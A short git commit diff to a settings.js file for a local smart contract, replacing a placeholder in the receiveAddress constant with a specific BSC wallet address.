63990758b16b076feace23363ff1196d87e1e51c
hezam1 <hezam1396@gmail.com>
2023-04-11 18:51:21 +0300

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "Replace this with your bsc address dont remove quatation marks";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0xc6ed52b043a1e4bde499cdc6a37524a076c523b7";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
